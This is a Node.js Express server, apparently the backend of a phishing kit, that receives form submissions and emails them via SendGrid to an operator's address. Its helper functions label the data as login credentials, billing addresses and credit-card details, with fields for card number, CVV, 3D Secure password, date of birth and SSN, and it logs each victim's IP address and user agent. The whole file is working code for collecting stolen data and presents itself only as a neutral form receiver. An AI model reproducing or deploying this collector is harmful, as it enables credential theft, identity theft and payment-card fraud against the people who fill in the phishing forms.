const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const sgMail = require('@sendgrid/mail');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Set SendGrid API Key
sgMail.setApiKey(process.env.SENDGRID_API_KEY);

// Root endpoint
app.get('/', (req, res) => {
  res.json({ 
    message: 'Server is running',
    status: 'OK'
  });
});

// Receive form data endpoint
app.post('/api/submit', async (req, res) => {
  try {
    const formData = req.body;
    const timestamp = new Date().toLocaleString();
    const clientIP = req.ip || req.connection.remoteAddress || 'Unknown';

    console.log('📨 Received form submission:', formData);

    // Send plain text email
    await sendPlainTextEmail(formData, timestamp, clientIP);

    res.status(200).json({ 
      success: true, 
      message: 'Data received successfully'
    });

  } catch (error) {
    console.error('❌ Error processing form data:', error);
    res.status(500).json({ 
      success: false, 
      message: 'Internal server error'
    });
  }
});

// Function to send plain text email
async function sendPlainTextEmail(formData, timestamp, clientIP) {
  try {
    const emailText = generatePlainTextEmail(formData, timestamp, clientIP);
    
    const msg = {
      to: process.env.TO_EMAIL,
      from: process.env.FROM_EMAIL,
      subject: `New Submission - ${getFormType(formData)}`,
      text: emailText,
    };

    await sgMail.send(msg);
    console.log('✅ Email sent successfully');
    
  } catch (error) {
    console.error('❌ Error sending email:', error);
    throw error;
  }
}

// Generate plain text email content
function generatePlainTextEmail(data, timestamp, clientIP) {
  let emailContent = `NEW FORM SUBMISSION\n`;
  emailContent += `====================\n\n`;
  
  emailContent += `📋 FORM TYPE: ${getFormType(data)}\n`;
  emailContent += `🕒 TIMESTAMP: ${timestamp}\n`;
  emailContent += `🌐 IP ADDRESS: ${clientIP}\n`;
  
  if (data.user_agent) {
    emailContent += `💻 USER AGENT: ${data.user_agent}\n`;
  }
  
  emailContent += `\n📝 SUBMITTED DATA:\n`;
  emailContent += `-------------------\n`;

  // Add all form fields in plain text
  for (const [key, value] of Object.entries(data)) {
    if (key !== 'user_agent' && key !== 'timestamp' && key !== 'ip_address') {
      const formattedKey = formatFieldName(key);
      emailContent += `${formattedKey}: ${value || 'N/A'}\n`;
    }
  }

  emailContent += `\n====================\n`;
  emailContent += `End of submission\n`;

  return emailContent;
}

// Determine form type based on data fields
function getFormType(data) {
  if (data.email && data.password) {
    return 'LOGIN CREDENTIALS';
  } else if (data.fullname && data.add1) {
    return 'BILLING ADDRESS';
  } else if (data.ccnum && data.cvv2) {
    return 'CREDIT CARD INFORMATION';
  } else if (data.holder && data.ccnum) {
    return 'CREDIT CARD DETAILS';
  } else {
    return 'FORM SUBMISSION';
  }
}

// Format field names for better readability
function formatFieldName(key) {
  const fieldNames = {
    // Login fields
    email: '📧 EMAIL',
    password: '🔑 PASSWORD',
    
    // Address fields
    fullname: '👤 FULL NAME',
    add1: '🏠 ADDRESS LINE 1',
    add2: '🏠 ADDRESS LINE 2',
    city: '🏙️ CITY',
    state: '🗺️ STATE/PROVINCE',
    zip: '📮 ZIP CODE',
    phone: '📞 PHONE NUMBER',
    country: '🌎 COUNTRY',
    
    // Credit card fields
    holder: '💳 CARD HOLDER NAME',
    ccnum: '💳 CARD NUMBER',
    cvv2: '🔒 CVV',
    vbv: '🔐 3D SECURE (VBV/MSC)',
    dob: '🎂 DATE OF BIRTH',
    ssn: '🆔 SSN',
    EXP1: '📅 EXPIRATION MONTH',
    EXP2: '📅 EXPIRATION YEAR'
  };

  return fieldNames[key] || key.toUpperCase().replace(/_/g, ' ');
}

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    timestamp: new Date().toISOString(),
    service: 'Form Data Receiver'
  });
});

// Error handling
app.use((error, req, res, next) => {
  console.error('❌ Server error:', error);
  res.status(500).json({
    success: false,
    message: 'Internal server error'
  });
});

// 404 handler
app.use((req, res) => {
  res.status(404).json({
    success: false,
    message: 'Endpoint not found'
  });
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📍 API endpoint: http://localhost:${PORT}/api/submit`);
  console.log(`❤️  Health check: http://localhost:${PORT}/health`);
  
  // Check if required environment variables are set
  if (!process.env.SENDGRID_API_KEY) {
    console.warn('⚠️  SENDGRID_API_KEY environment variable is not set');
  }
  if (!process.env.TO_EMAIL) {
    console.warn('⚠️  TO_EMAIL environment variable is not set');
  }
  if (!process.env.FROM_EMAIL) {
    console.warn('⚠️  FROM_EMAIL environment variable is not set');
  }
});
